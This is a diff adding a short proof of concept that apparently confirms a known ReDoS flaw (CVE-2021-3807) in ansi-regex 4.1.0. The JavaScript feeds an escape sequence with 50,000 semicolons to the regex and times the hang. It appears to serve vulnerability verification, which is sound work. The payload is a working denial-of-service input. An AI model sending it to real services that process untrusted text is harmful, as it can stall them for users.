@@ -1,0 +1,20 @@
+Confirmed: 7.6 seconds for 50k characters — classic catastrophic backtracking (ReDoS, CVE-2021-3807) in `ansi-regex@4.1.0`. Here's the exploit:
+
+```javascript
+// ReDoS exploit for ansi-regex@4.1.0 (CVE-2021-3807)
+// The regex alternative `(?:(?:\d{1,4}(?:;\d{0,4})*)?[\dA-PR-TZcf-ntqry=><~])`
+// suffers catastrophic backtracking when fed a long run of ';' that never
+// terminates in a valid final character, causing exponential blowup.
+
+const ansiRegex = require("ansi-regex");
+
+const ESC = String.fromCharCode(27); // \u001B
+const payload = ESC + "[" + ";".repeat(50000); // no valid terminator char
+
+console.log("Starting match... this should hang for several seconds.");
+const start = Date.now();
+
+payload.match(ansiRegex());
+
+console.log(`Took ${Date.now() - start} ms to process ${payload.length} chars`);
+```
